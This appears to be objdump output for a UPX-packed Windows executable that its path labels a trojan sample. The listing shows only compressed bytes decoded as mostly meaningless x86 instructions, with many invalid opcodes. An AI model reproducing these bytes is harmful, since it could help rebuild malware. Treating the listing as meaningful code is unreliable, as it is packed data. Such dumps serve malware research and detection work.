
malware_samples/trojan/769a3560c21201f48c136363fe59683fbf0dcfcbbd034a0f6590c353b4aceb09.exe:     file format pei-i386


Disassembly of section UPX0:

00401000 <UPX0>:
	...

Disassembly of section UPX1:

0042b000 <UPX1>:
  42b000:	a1 00 2a 90 00       	mov    0x902a00,%eax
  42b005:	46                   	inc    %esi
  42b006:	01 54 20 8c          	add    %edx,-0x74(%eax,%eiz,1)
  42b00a:	02 a8 40 19 05 50    	add    0x50051940(%eax),%ch
  42b010:	81 32 0a a0 02 64    	xorl   $0x6402a00a,(%edx)
  42b016:	14 40                	adc    $0x40,%al
  42b018:	05 c8 28 80 0a       	add    $0xa8028c8,%eax
  42b01d:	90                   	nop
  42b01e:	51                   	push   %ecx
  42b01f:	00 15 20 a3 00 2a    	add    %dl,0x2a00a320
  42b025:	40                   	inc    %eax
  42b026:	46                   	inc    %esi
  42b027:	01 54 81 8c          	add    %edx,-0x74(%ecx,%eax,4)
  42b02b:	02 a8 02 19 05 50    	add    0x50051902(%eax),%ch
  42b031:	05 32 0a a0 0a       	add    $0xaa00a32,%eax
  42b036:	64 14 40             	fs adc $0x40,%al
  42b039:	50                   	push   %eax
  42b03a:	d9 28                	fldcw  (%eax)
  42b03c:	80 03 59             	addb   $0x59,(%ebx)
  42b03f:	36 7f 50             	ss jg  0x42b092
  42b042:	d1 87 42 00 fb 25    	roll   $1,0x25fb0042(%edi)
  42b048:	88 55 b3             	mov    %dl,-0x4d(%ebp)
  42b04b:	6c                   	insb   (%dx),%es:(%edi)
  42b04c:	9a a6 85 b5 e5 15 89 	lcall  $0x8915,$0xe5b585a6
  42b053:	45                   	inc    %ebp
  42b054:	6e                   	outsb  %ds:(%esi),(%dx)
  42b055:	d3 34 4d 75 a5 dc ff 	shll   %cl,-0x235a8b(,%ecx,2)
  42b05c:	22 8a 17 cc b2 59    	and    0x59b2cc17(%edx),%cl
  42b062:	76 03                	jbe    0x42b067
  42b064:	b8 93 e1 10 94       	mov    $0x9410e193,%eax
  42b069:	3f                   	aas
  42b06a:	7b b9                	jnp    0x42b025
  42b06c:	3d c2 00 ec 76       	cmp    $0x76ec00c2,%eax
  42b071:	1b 04 27             	sbb    (%edi,%eiz,1),%eax
  42b074:	48                   	dec    %eax
  42b075:	77 42                	ja     0x42b0b9
  42b077:	03 67 97             	add    -0x69(%edi),%esp
  42b07a:	cd 7f                	int    $0x7f
  42b07c:	5f                   	pop    %edi
  42b07d:	95                   	xchg   %eax,%ebp
  42b07e:	05 06 05 05 05       	add    $0x5050506,%eax
  42b083:	01 fa                	add    %edi,%edx
  42b085:	fa                   	cli
  42b086:	bd 05 00 45 ff       	mov    $0xff450005,%ebp
  42b08b:	ef                   	out    %eax,(%dx)
  42b08c:	ae                   	scas   %es:(%edi),%al
  42b08d:	92                   	xchg   %eax,%edx
  42b08e:	05 dd 04 0b 1a       	add    $0x1a0b04dd,%eax
  42b093:	bf 0b 05 b1 0c       	mov    $0xcb1050b,%edi
  42b098:	c8 24 bd 04          	enter  $0xbd24,$0x4
  42b09c:	49                   	dec    %ecx
  42b09d:	ff                   	(bad)
  42b09e:	ff                   	(bad)
  42b09f:	ff 2f                	ljmp   *(%edi)
  42b0a1:	51                   	push   %ecx
  42b0a2:	6d                   	insl   (%dx),%es:(%edi)
  42b0a3:	6c                   	insb   (%dx),%es:(%edi)
  42b0a4:	76 25                	jbe    0x42b0cb
  42b0a6:	75 77                	jne    0x42b11f
  42b0a8:	6a 62                	push   $0x62
  42b0aa:	77 64                	ja     0x42b110
  42b0ac:	68 25 66 64 6b       	push   $0x6b646625
  42b0b1:	6b 6a 71 25          	imul   $0x25,0x71(%edx),%ebp
  42b0b5:	67 60                	addr16 pusha
  42b0b7:	25 77 70 6b 25       	and    $0x256b7077,%eax
  42b0bc:	1f                   	pop    %ds
  42b0bd:	ec                   	in     (%dx),%al
  42b0be:	ff b7 6c 02 41 4a    	push   0x4a41026c(%edi)
  42b0c4:	56                   	push   %esi
  42b0c5:	25 68 6a 61 60       	and    $0x60616a68,%eax
  42b0ca:	2b 08                	sub    (%eax),%ecx
  42b0cc:	08 0f                	or     %cl,(%edi)
  42b0ce:	21 43 cc             	and    %eax,-0x34(%ebx)
  42b0d1:	21 41 ee             	and    %eax,-0x12(%ecx)
  42b0d4:	c8 dd 1f f6          	enter  $0x1fdd,$0xf6
  42b0d8:	88 40 2f             	mov    %al,0x2f(%eax)
  42b0db:	bd 03 f3 5c 23       	mov    $0x235cf303,%ebp
  42b0e0:	bd 89 07 0b 5c       	mov    $0x5c0b0789,%ebp
  42b0e5:	21 dd                	and    %ebx,%ebp
  42b0e7:	63 8f fc 60 5f 25    	arpl   %ecx,0x255f60fc(%edi)
  42b0ed:	bd 8c 2b bd 8a       	mov    $0x8abd2b8c,%ebp
  42b0f2:	23 2e                	and    (%esi),%ebp
  42b0f4:	bd ae 17 4b f6       	mov    $0xf64b17ae,%ebp
  42b0f9:	3e 36 f2 4f          	ds ss repnz dec %edi
  42b0fd:	72 bd                	jb     0x42b0bc
  42b0ff:	8f                   	(bad)
  42b100:	39 27                	cmp    %esp,(%edi)
  42b102:	57                   	push   %edi
  42b103:	6c                   	insb   (%dx),%es:(%edi)
  42b104:	66 6d                	insw   (%dx),%es:(%edi)
  42b106:	3f                   	aas
  42b107:	9b                   	fwait
  42b108:	c3                   	ret
  42b109:	be 5d 1e 55 40       	mov    $0x40551e5d,%esi
  42b10e:	49                   	dec    %ecx
  42b10f:	04 d9                	add    $0xd9,%al
  42b111:	d3 dd                	rcr    %cl,%ebp
  42b113:	e2 42                	loop   0x42b157
  42b115:	13 b7 b3 db b7 e5    	adc    -0x1a48244d(%edi),%esi
  42b11b:	ad                   	lods   %ds:(%esi),%eax
  42b11c:	24 0e                	and    $0xe,%al
  42b11e:	04 03                	add    $0x3,%al
  42b120:	08 15 05 03 85 08    	or     %dl,0x8850305
  42b126:	95                   	xchg   %eax,%ebp
  42b127:	9e                   	sahf
  42b128:	f0 b9 d3 35 95 10    	lock mov $0x109535d3,%ecx
  42b12e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  42b12f:	15 06 07 26 b7       	adc    $0xb7260706,%eax
  42b134:	64 ef                	fs out %eax,(%dx)
  42b136:	0f 00 07             	sldt   (%edi)
  42b139:	33 b5 15 b2 81 9d    	xor    -0x627e4deb(%ebp),%esi
  42b13f:	cd 1e                	int    $0x1e
  42b141:	40                   	inc    %eax
  42b142:	15 07 06 06 12       	adc    $0x12060607,%eax
  42b147:	be 59 00 4f 04       	mov    $0x44f0059,%esi
  42b14c:	3c a4                	cmp    $0xa4,%al
  42b14e:	f3 57                	repz push %edi
  42b150:	81 dd 1f 09 05 00    	sbb    $0x5091f,%ebp
  42b156:	50                   	push   %eax
  42b157:	55                   	push   %ebp
  42b158:	5d                   	pop    %ebp
  42b159:	35 05 cb d9 c8       	xor    $0xc8d9cb05,%eax
  42b15e:	de 85 97 c4 27 85    	fiadds -0x7ad83b69(%ebp)
  42b164:	e5 2b                	in     $0x2b,%eax
  42b166:	fb                   	sti
  42b167:	92                   	xchg   %eax,%edx
  42b168:	35 34 b4 ff 0b       	xor    $0xbffb434,%eax
  42b16d:	27                   	daa
  42b16e:	9a 66 92 93 45 37 a5 	lcall  $0xa537,$0x45939266
  42b175:	07                   	pop    %es
  42b176:	17                   	pop    %ss
  42b177:	55                   	push   %ebp
  42b178:	40                   	inc    %eax
  42b179:	76 4a                	jbe    0x42b1c5
  42b17b:	c5 05 00 e1 ff ff    	lds    0xffffe100,%eax
  42b181:	f8                   	clc
  42b182:	37                   	aaa
  42b183:	2b 35 37 0f 24 08    	sub    0x8240f37,%esi
  42b189:	0c 07                	or     $0x7,%al
  42b18b:	0d 71 5b f2 31       	or     $0x31f25b71,%eax
  42b190:	c8 a6 a9 88          	enter  $0xa9a6,$0x88
  42b194:	04 71                	add    $0x71,%al
  42b196:	c3                   	ret
  42b197:	b7 3e                	mov    $0x3e,%bh
  42b199:	d2 70 88             	shlb   %cl,-0x78(%eax)
  42b19c:	0e                   	push   %cs
  42b19d:	ac                   	lods   %ds:(%esi),%al
  42b19e:	2d 2c a4 05 2f       	sub    $0x2f05a42c,%eax
  42b1a3:	00 43 04             	add    %al,0x4(%ebx)
  42b1a6:	ff                   	(bad)
  42b1a7:	ff b7 fe 51 25 89    	push   -0x76daae02(%edi)
  42b1ad:	07                   	pop    %es
  42b1ae:	ad                   	lods   %ds:(%esi),%eax
  42b1af:	45                   	inc    %ebp
  42b1b0:	1c 72                	sbb    $0x72,%al
  42b1b2:	84 37                	test   %dh,(%edi)
  42b1b4:	0f a5 07             	shld   %cl,%eax,(%edi)
  42b1b7:	61                   	popa
  42b1b8:	11 45 00             	adc    %eax,0x0(%ebp)
  42b1bb:	cd 2d                	int    $0x2d
  42b1bd:	85 0f                	test   %ecx,(%edi)
  42b1bf:	95                   	xchg   %eax,%ebp
  42b1c0:	54                   	push   %esp
  42b1c1:	05 10 25 9a a6       	add    $0xa69a2510,%eax
  42b1c6:	e9 b6 a6 21 45       	jmp    0x45645881
  42b1cb:	20 84 07 00 0f 69 9a 	and    %al,-0x6596f100(%edi,%eax,1)
  42b1d2:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  42b1d3:	69 10 2f 51 ad 55    	imul   $0x55ad512f,(%eax),%edx
  42b1d9:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  42b1da:	69 9a a6 a5 45 85 05 	imul   $0xa69a0505,-0x7aba5a5a(%edx),%ebx
  42b1e1:	05 9a a6 
  42b1e4:	69 9a 04 07 00 0f 11 	imul   $0x60112d11,0xf000704(%edx),%ebx
  42b1eb:	2d 11 60 
  42b1ee:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  42b1ef:	69 54 a6 7b ff ff df 	imul   $0x1cdfffff,0x7b(%esi,%eiz,4),%edx
  42b1f6:	1c 
  42b1f7:	c7 02 bb 3c 0f 05    	movl   $0x50f3cbb,(%edx)
  42b1fd:	77 60                	ja     0x42b25f
  42b1ff:	7d 6e                	jge    0x42b26f
  42b201:	77 2b                	ja     0x42b22e
  42b203:	f7 9e ab 6e 0f 06    	negl   0x60f6eab(%esi)
  42b209:	72 02                	jb     0x42b20d
  42b20b:	64 5b                	fs pop %ebx
  42b20d:	ff                   	(bad)
  42b20e:	ff d2                	call   *%edx
  42b210:	ff 6a 77             	ljmp   *0x77(%edx)
  42b213:	7d 29                	jge    0x42b23e
  42b215:	74 c3                	je     0x42b1da
  42b217:	fb                   	sti
  42b218:	b2 08                	mov    $0x8,%dl
  42b21a:	73 ae                	jae    0x42b1ca
  42b21c:	16                   	push   %ss
  42b21d:	75 33                	jne    0x42b252
  42b21f:	34 76                	xor    $0x76,%al
  42b221:	34 33                	xor    $0x33,%al
  42b223:	0b 25 a9 dc fb e2    	or     0xe2fbdca9,%esp
  42b229:	0a 06                	or     (%esi),%al
  42b22b:	8d                   	lea    (bad),%edi
  42b22c:	ff                   	(bad)
  42b22d:	ff                   	(bad)
  42b22e:	ff 61 73             	jmp    *0x73(%ecx)
  42b231:	77 3d                	ja     0x42b270
  42b233:	28 28                	sub    %ch,(%eax)
  42b235:	0e                   	push   %cs
  42b236:	3f                   	aas
  42b237:	45                   	inc    %ebp
  42b238:	46                   	inc    %esi
  42b239:	f2 fa                	repnz cli
  42b23b:	fe                   	(bad)
  42b23c:	12 3a                	adc    (%edx),%bh
  42b23e:	63 64 36 31          	arpl   %esp,0x31(%esi,%esi,1)
  42b242:	36 72 76             	ss jb  0x42b2bb
  42b245:	37                   	aaa
  42b246:	5a                   	pop    %edx
  42b247:	36 0a 6f 5f          	or     %ss:0x5f(%edi),%ch
  42b24b:	e0 f6                	loopne 0x42b243
  42b24d:	61                   	popa
  42b24e:	69 69 0e 13 dd 68 86 	imul   $0x8668dd13,0xe(%ecx),%ebp
  42b255:	04 60                	add    $0x60,%al
  42b257:	71 09                	jno    0x42b262
  42b259:	53                   	push   %ebx
  42b25a:	66 73 1a             	data16 jae 0x42b277
  42b25d:	ff b7 fe ff 52 56    	push   0x5652fffe(%edi)
  42b263:	44                   	inc    %esp
  42b264:	56                   	push   %esi
  42b265:	60                   	pusha
  42b266:	6b 0a dd             	imul   $0xffffffdd,(%edx),%ecx
  42b269:	fe                   	(bad)
  42b26a:	bb 61 02 57 17       	mov    $0x17570261,%ebx
  42b26f:	76 8d                	jbe    0x42b1fe
  42b271:	50                   	push   %eax
  42b272:	8e e9                	mov    %ecx,%gs
  42b274:	82 f8 6a             	cmp    $0x6a,%al
  42b277:	fa                   	cli
  42b278:	54                   	push   %esp
  42b279:	54                   	push   %esp
  42b27a:	8e 05 fe bf c0 40    	mov    0x40c0bffe,%es
  42b280:	0d 73 f9 00 f9       	or     $0xf900f973,%eax
  42b285:	0a bb 05 86 fd 25    	or     0x25fd8605(%ebx),%bh
  42b28b:	71 24                	jno    0x42b2b1
  42b28d:	0f df ff             	pandn  %mm7,%mm7
  42b290:	ff                   	(bad)
  42b291:	ff                   	(bad)
  42b292:	ff 82 79 cd 71 13    	incl   0x1371cd79(%edx)
  42b298:	08 71 0e             	or     %dh,0xe(%ecx)
  42b29b:	0f 70 0c 45 3e 73 ee 	pshufw $0x37,0x73ee733e(,%eax,2),%mm1
  42b2a2:	73 37 
  42b2a4:	ee                   	out    %al,(%dx)
  42b2a5:	ce                   	into
  42b2a6:	0d 3e 38 71 2d       	or     $0x2d71383e,%eax
  42b2ab:	47                   	inc    %edi
  42b2ac:	fd                   	std
  42b2ad:	8e 07                	mov    (%edi),%es
  42b2af:	d8 a9 76 ba ff ff    	fsubrs -0x458a(%ecx)
  42b2b5:	ff                   	(bad)
  42b2b6:	ff 48 f9             	decl   -0x7(%eax)
  42b2b9:	8f                   	(bad)
  42b2ba:	0c 8d                	or     $0x8d,%al
  42b2bc:	0d 0c 25 fd 37       	or     $0x37fd250c,%eax
  42b2c1:	16                   	push   %ss
  42b2c2:	44                   	inc    %esp
  42b2c3:	82 b8 d8 b2 8c 06 80 	cmpb   $0x80,0x68cb2d8(%eax)
  42b2ca:	c5 70 db             	lds    -0x25(%eax),%esi
  42b2cd:	22 cc                	and    %ah,%cl
  42b2cf:	c6                   	(bad)
  42b2d0:	71 76                	jno    0x42b348
  42b2d2:	0d bf 9e 6b 36       	or     $0x366b9ebf,%eax
  42b2d7:	ff                   	lcall  (bad)
  42b2d8:	df fe                	(bad)
  42b2da:	ff 1d 71 54 0d 0d    	lcall  *0xd0d5471
  42b2e0:	ee                   	out    %al,(%dx)
  42b2e1:	e8 0d 4d bc 61       	call   0x61fefff3
  42b2e6:	b7 62                	mov    $0x62,%bh
  42b2e8:	1c 88                	sbb    $0x88,%al
  42b2ea:	0b 2b                	or     (%ebx),%ebp
  42b2ec:	79 44                	jns    0x42b332
  42b2ee:	2b 0d 2e 85 29 ee    	sub    0xee29852e,%ecx
  42b2f4:	c0 da f3             	rcr    $0xf3,%dl
  42b2f7:	df fe                	(bad)
  42b2f9:	06                   	push   %es
  42b2fa:	ff 33                	push   (%ebx)
  42b2fc:	e3 68                	jecxz  0x42b366
  42b2fe:	59                   	pop    %ecx
  42b2ff:	fa                   	cli
  42b300:	17                   	pop    %ss
  42b301:	ed                   	in     (%dx),%eax
  42b302:	26 7f 5c             	es jg  0x42b361
  42b305:	0d 8a 69 7e a1       	or     $0xa17e698a,%eax
  42b30a:	60                   	pusha
  42b30b:	58                   	pop    %eax
  42b30c:	86 60 f9             	xchg   %ah,-0x7(%eax)
  42b30f:	ff                   	lcall  (bad)
  42b310:	df fa                	(bad)
  42b312:	b7 2d                	mov    $0x2d,%bh
  42b314:	fe                   	(bad)
  42b315:	6a 5e                	push   $0x5e
  42b317:	7d 12                	jge    0x42b32b
  42b319:	1b fa                	sbb    %edx,%edi
  42b31b:	10 7c 52 3c          	adc    %bh,0x3c(%edx,%edx,2)
  42b31f:	0e                   	push   %cs
  42b320:	78 5e                	js     0x42b380
  42b322:	fc                   	cld
  42b323:	d3 df                	rcr    %cl,%edi
  42b325:	b6 06                	mov    $0x6,%dh
  42b327:	e4 f5                	in     $0xf5,%al
  42b329:	e0 ff                	loopne 0x42b32a
  42b32b:	ff                   	(bad)
  42b32c:	ff 07                	incl   (%edi)
  42b32e:	b4 0e                	mov    $0xe,%ah
  42b330:	b5 8d                	mov    $0x8d,%ch
  42b332:	04 ee                	add    $0xee,%al
  42b334:	d0 f3                	shl    $1,%bl
  42b336:	cd b3                	int    $0xb3
  42b338:	20 29                	and    %ch,(%ecx)
  42b33a:	15 2a 09 5d 5c       	adc    $0x5c5d092a,%eax
  42b33f:	5c                   	pop    %esp
  42b340:	38 fa                	cmp    %bh,%dl
  42b342:	5b                   	pop    %ebx
  42b343:	9e                   	sahf
  42b344:	29 45 51             	sub    %eax,0x51(%ebp)
  42b347:	15 ff ff ff df       	adc    $0xdfffffff,%eax
  42b34c:	57                   	push   %edi
  42b34d:	55                   	push   %ebp
  42b34e:	5c                   	pop    %esp
  42b34f:	36 c5 d8 68          	(bad)
  42b353:	e4 66                	in     $0x66,%al
  42b355:	35 84 e9 01 0d       	xor    $0xd01e984,%eax
  42b35a:	5a                   	pop    %edx
  42b35b:	6d                   	insl   (%dx),%es:(%edi)
  42b35c:	17                   	pop    %ss
  42b35d:	36 0d 32 ed 60 6a    	ss or  $0x6a60ed32,%eax
  42b363:	d2 df                	rcr    %cl,%bh
  42b365:	e4 09                	in     $0x9,%al
  42b367:	09 20                	or     %esp,(%eax)
  42b369:	ff                   	(bad)
  42b36a:	ff                   	(bad)
  42b36b:	ff                   	(bad)
  42b36c:	ff 0b                	decl   (%ebx)
  42b36e:	45                   	inc    %ebp
  42b36f:	b5 30                	mov    $0x30,%ch
  42b371:	43                   	inc    %ebx
  42b372:	f5                   	cmc
  42b373:	be de e8 86 78       	mov    $0x7886e8de,%esi
  42b378:	94                   	xchg   %eax,%esp
  42b379:	70 01                	jo     0x42b37c
  42b37b:	31 ee                	xor    %ebp,%esi
  42b37d:	7c 90                	jl     0x42b30f
  42b37f:	8e 45 09             	mov    0x9(%ebp),%es
  42b382:	86 e5                	xchg   %ah,%ch
  42b384:	15 6b e4 ca d2       	adc    $0xd2cae46b,%eax
  42b389:	2d 4b 36 a2 ff       	sub    $0xffa2364b,%eax
  42b38e:	2f                   	das
  42b38f:	f1                   	int1
  42b390:	ff                   	(bad)
  42b391:	38 a5 be 08 b3 3b    	cmp    %ah,0x3bb308be(%ebp)
  42b397:	5a                   	pop    %edx
  42b398:	3b b3 b8 6e 39 7b    	cmp    0x7b396eb8(%ebx),%esi
  42b39e:	80 f9 f2             	cmp    $0xf2,%cl
  42b3a1:	d5 55                	aad    $0x55
  42b3a3:	45                   	inc    %ebp
  42b3a4:	65 86 c1             	gs xchg %al,%cl
  42b3a7:	09 64 ff ff          	or     %esp,-0x1(%edi,%edi,8)
  42b3ab:	ff                   	(bad)
  42b3ac:	ff 82 71 c6 0a 67    	incl   0x670ac671(%edx)
  42b3b2:	77 36                	ja     0x42b3ea
  42b3b4:	10 e2                	adc    %ah,%dl
  42b3b6:	5e                   	pop    %esi
  42b3b7:	73 e9                	jae    0x42b3a2
  42b3b9:	ed                   	in     (%dx),%eax
  42b3ba:	6e                   	outsb  %ds:(%esi),(%dx)
  42b3bb:	17                   	pop    %ss
  42b3bc:	ee                   	out    %al,(%dx)
  42b3bd:	a0 98 2d 4a 3e       	mov    0x3e4a2d98,%al
  42b3c2:	0c fa                	or     $0xfa,%al
  42b3c4:	68 61 72 70 06       	push   $0x6707261
  42b3c9:	6f                   	outsl  %ds:(%esi),(%dx)
  42b3ca:	04 5d                	add    $0x5d,%al
  42b3cc:	cc                   	int3
  42b3cd:	e9 ff ff ff 1f       	jmp    0x2042b3d1
  42b3d2:	6f                   	outsl  %ds:(%esi),(%dx)
  42b3d3:	07                   	pop    %es
  42b3d4:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  42b3d5:	97                   	xchg   %eax,%edi
  42b3d6:	c6                   	(bad)
  42b3d7:	33 f9                	xor    %ecx,%edi
  42b3d9:	b1 ed                	mov    $0xed,%cl
  42b3db:	d4 fb                	aam    $0xfb
  42b3dd:	31 5c 55 ac          	xor    %ebx,-0x54(%ebp,%edx,2)
  42b3e1:	69 e1 e9 72 72 71    	imul   $0x717272e9,%ecx,%esp
  42b3e7:	27                   	daa
  42b3e8:	a0 c3 05 6b 0f       	mov    0xf6b05c3,%al
  42b3ed:	37                   	aaa
  42b3ee:	f8                   	clc
  42b3ef:	bf 41 70 07 da       	mov    $0xda077041,%edi
  42b3f4:	87 f5                	xchg   %esi,%ebp
  42b3f6:	e1 06                	loope  0x42b3fe
  42b3f8:	01 6b 05             	add    %ebp,0x5(%ebx)
  42b3fb:	4c                   	dec    %esp
  42b3fc:	11 11                	adc    %edx,(%ecx)
  42b3fe:	ed                   	in     (%dx),%eax
  42b3ff:	0b ff                	or     %edi,%edi
  42b401:	06                   	push   %es
  42b402:	ff b3 76 ce da e6    	push   -0x1925318a(%ebx)
  42b408:	0e                   	push   %cs
  42b409:	c6                   	(bad)
  42b40a:	f1                   	int1
  42b40b:	1c 40                	sbb    $0x40,%al
  42b40d:	4b                   	dec    %ebx
  42b40e:	11 98 65 56 38 3e    	adc    %ebx,0x3e385665(%eax)
  42b414:	1e                   	push   %ds
  42b415:	ff                   	(bad)
  42b416:	ff                   	(bad)
  42b417:	ff                   	(bad)
  42b418:	ff e2                	jmp    *%edx
  42b41a:	2a 16                	sub    (%esi),%dl
  42b41c:	2d b1 5c 99 78       	sub    $0x78995cb1,%eax
  42b421:	b4 82                	mov    $0x82,%ah
  42b423:	27                   	daa
  42b424:	ed                   	in     (%dx),%eax
  42b425:	a0 0b 88 b9 1a       	mov    0x1ab9880b,%al
  42b42a:	91                   	xchg   %eax,%ecx
  42b42b:	72 b3                	jb     0x42b3e0
  42b42d:	fe 8b ee 64 17 c5    	decb   -0x3ae89b12(%ebx)
  42b433:	01 2b                	add    %ebp,(%ebx)
  42b435:	d1 2d 65 af ff ff    	shrl   $1,0xffffaf65
  42b43b:	ff b7 9e 1a 03 02    	push   0x2031a9e(%edi)
  42b441:	f3 15 3f 73 0e 73    	repz adc $0x730e733f,%eax
  42b447:	5a                   	pop    %edx
  42b448:	e9 dd 22 ed 6b       	jmp    0x6c2fd72a
  42b44d:	c8 3d c1 55          	enter  $0xc13d,$0x55
  42b451:	2a dd                	sub    %ch,%bl
  42b453:	b4 b6                	mov    $0xb6,%ah
  42b455:	ce                   	into
  42b456:	4b                   	dec    %ebx
  42b457:	22 3d 6f ff ff ff    	and    0xffffff6f,%bh
  42b45d:	11 14 38             	adc    %edx,(%eax,%edi,1)
  42b460:	3d 26 1d ce 6d       	cmp    $0x6dce1d26,%eax
  42b465:	bb 2f 90 2a 9b       	mov    $0x9b2a902f,%ebx
  42b46a:	e1 64                	loope  0x42b4d0
  42b46c:	01 78 35             	add    %edi,0x35(%eax)
  42b46f:	79 3c                	jns    0x42b4ad
  42b471:	7b 69                	jnp    0x42b4dc
  42b473:	0b fc                	or     %esp,%edi
  42b475:	91                   	xchg   %eax,%ecx
  42b476:	10 44 5f 97          	adc    %al,-0x69(%edi,%ebx,2)
  42b47a:	de fe                	fdivrp %st,%st(6)
  42b47c:	ff                   	(bad)
  42b47d:	7b 53                	jnp    0x42b4d2
  42b47f:	64 46                	fs inc %esi
  42b481:	3b e9                	cmp    %ecx,%ebp
  42b483:	4e                   	dec    %esi
  42b484:	7f 7b                	jg     0x42b501
  42b486:	45                   	inc    %ebp
  42b487:	0f 5a 71 30          	cvtps2pd 0x30(%ecx),%xmm6
  42b48b:	e3 0b                	jecxz  0x42b498
  42b48d:	e1 28                	loope  0x42b4b7
  42b48f:	71 cf                	jno    0x42b460
  42b491:	71 1a                	jno    0x42b4ad
  42b493:	ff                   	(bad)
  42b494:	ff                   	(bad)
  42b495:	ff                   	(bad)
  42b496:	ff 2b                	ljmp   *(%ebx)
  42b498:	71 11                	jno    0x42b4ab
  42b49a:	f5                   	cmc
  42b49b:	f4                   	hlt
  42b49c:	8d b0 2e 76 78 9d    	lea    -0x628789d2(%eax),%esi
  42b4a2:	e4 0f                	in     $0xf,%al
  42b4a4:	f2 dc 7d a6          	repnz fdivrl -0x5a(%ebp)
  42b4a8:	87 07                	xchg   %eax,(%edi)
  42b4aa:	0a 80 63 df fa 82    	or     -0x7d05209d(%eax),%al
  42b4b0:	0f aa                	rsm
  42b4b2:	9b                   	fwait
  42b4b3:	4a                   	dec    %edx
  42b4b4:	bb 32 2e ff bf       	mov    $0xbfff2e32,%ebx
  42b4b9:	f1                   	int1
  42b4ba:	ff 02                	incl   (%edx)
  42b4bc:	73 62                	jae    0x42b520
  42b4be:	08 7c 2d 76          	or     %bh,0x76(%ebp,%ebp,1)
  42b4c2:	5c                   	pop    %esp
  42b4c3:	6e                   	outsb  %ds:(%esi),(%dx)
  42b4c4:	bb ea c8 6d 48       	mov    $0x486dc8ea,%ebx
  42b4c9:	41                   	inc    %ecx
  42b4ca:	04 f8                	add    $0xf8,%al
  42b4cc:	4a                   	dec    %edx
  42b4cd:	29 10                	sub    %edx,(%eax)
  42b4cf:	50                   	push   %eax
  42b4d0:	45                   	inc    %ebp
  42b4d1:	9b                   	fwait
  42b4d2:	62 45 f9             	bound  %eax,-0x7(%ebp)
  42b4d5:	f0 ff                	lock (bad)
  42b4d7:	ff                   	(bad)
  42b4d8:	ff 13                	call   *(%ebx)
  42b4da:	3a 19                	cmp    (%ecx),%bl
  42b4dc:	e1 d6                	loope  0x42b4b4
  42b4de:	63 fe                	arpl   %edi,%esi
  42b4e0:	70 12                	jo     0x42b4f4
  42b4e2:	44                   	inc    %esp
  42b4e3:	b6 f9                	mov    $0xf9,%dh
  42b4e5:	35 fb ed 9f b5       	xor    $0xb59fedfb,%eax
  42b4ea:	c6                   	(bad)
  42b4eb:	23 ee                	and    %esi,%ebp
  42b4ed:	07                   	pop    %es
  42b4ee:	dc 34 53             	fdivl  (%ebx,%edx,2)
  42b4f1:	b3 e2                	mov    $0xe2,%bl
  42b4f3:	35 c3 0b ff ff       	xor    $0xffff0bc3,%eax
  42b4f8:	bf 84 1a 49 fd       	mov    $0xfd491a84,%edi
  42b4fd:	99                   	cltd
  42b4fe:	fd                   	std
  42b4ff:	ce                   	into
  42b500:	83 76 58 81          	xorl   $0xffffff81,0x58(%esi)
  42b504:	b9 50 0c d6 02       	mov    $0x2d60c50,%ecx
  42b509:	ec                   	in     (%dx),%al
  42b50a:	e2 e8                	loop   0x42b4f4
  42b50c:	fc                   	cld
  42b50d:	bc b4 42 d8 7e       	mov    $0x7ed842b4,%esp
  42b512:	e3 ff                	jecxz  0x42b513
  42b514:	ff 0c f5 0f fd ed d7 	decl   -0x281202f1(,%esi,8)
  42b51b:	17                   	pop    %ss
  42b51c:	49                   	dec    %ecx
  42b51d:	52                   	push   %edx
  42b51e:	e6 2e                	out    %al,$0x2e
  42b520:	f5                   	cmc
  42b521:	8c 94 26 4d 59 c6 03 	mov    %ss,0x3c6594d(%esi,%eiz,1)
  42b528:	0a fd                	or     %ch,%bh
  42b52a:	fd                   	std
  42b52b:	4e                   	dec    %esi
  42b52c:	10 4e ff             	adc    %cl,-0x1(%esi)
  42b52f:	bb 7f e7 a9 a7       	mov    $0xa7a9e77f,%ebx
  42b534:	30 64 18 f7          	xor    %ah,-0x9(%eax,%ebx,1)
  42b538:	64 0e                	fs push %cs
  42b53a:	59                   	pop    %ecx
  42b53b:	1a a6 11 28 73 b8    	sbb    -0x478cd7ef(%esi),%ah
  42b541:	c3                   	ret
  42b542:	7f 5d                	jg     0x42b5a1
  42b544:	8c ee                	mov    %gs,%esi
  42b546:	97                   	xchg   %eax,%edi
  42b547:	ff                   	(bad)
  42b548:	ff                   	(bad)
  42b549:	ff                   	(bad)
  42b54a:	ff af 70 8c c6 be    	ljmp   *-0x41397390(%edi)
  42b550:	34 e3                	xor    $0xe3,%al
  42b552:	81 b1 4d da ed 11 df 	xorl   $0x9e666ddf,0x11edda4d(%ecx)
  42b559:	6d 66 9e 
  42b55c:	e4 4d                	in     $0x4d,%al
  42b55e:	06                   	push   %es
  42b55f:	ec                   	in     (%dx),%al
  42b560:	2f                   	das
  42b561:	52                   	push   %edx
  42b562:	b0 5b                	mov    $0x5b,%al
  42b564:	e1 bd                	loope  0x42b523
  42b566:	92                   	xchg   %eax,%edx
  42b567:	99                   	cltd
  42b568:	de f8                	fdivrp %st,%st(0)
  42b56a:	45                   	inc    %ebp
  42b56b:	ff                   	(bad)
  42b56c:	ff                   	(bad)
  42b56d:	7f 89                	jg     0x42b4f8
  42b56f:	08 e0                	or     %ah,%al
  42b571:	ed                   	in     (%dx),%eax
  42b572:	39 a8 6d 33 0c c0    	cmp    %ebp,-0x3ff3cc93(%eax)
  42b578:	7f c5                	jg     0x42b53f
  42b57a:	f7 dc                	neg    %esp
  42b57c:	5b                   	pop    %ebx
  42b57d:	61                   	popa
  42b57e:	95                   	xchg   %eax,%ebp
  42b57f:	f9                   	stc
  42b580:	41                   	inc    %ecx
  42b581:	0a 41 ef             	or     -0x11(%ecx),%al
  42b584:	e8 d1 4d c6 ff       	call   0x9035a
  42b589:	ff                   	(bad)
  42b58a:	ff d7                	call   *%edi
  42b58c:	f0 4d                	lock dec %ebp
  42b58e:	a1 2a 1d f3 b8       	mov    0xb8f31d2a,%eax
  42b593:	48                   	dec    %eax
  42b594:	7b 6d                	jnp    0x42b603
  42b596:	fa                   	cli
  42b597:	fb                   	sti
  42b598:	2b 01                	sub    (%ecx),%eax
  42b59a:	14 f7                	adc    $0xf7,%al
  42b59c:	96                   	xchg   %eax,%esi
  42b59d:	1b c2                	sbb    %edx,%eax
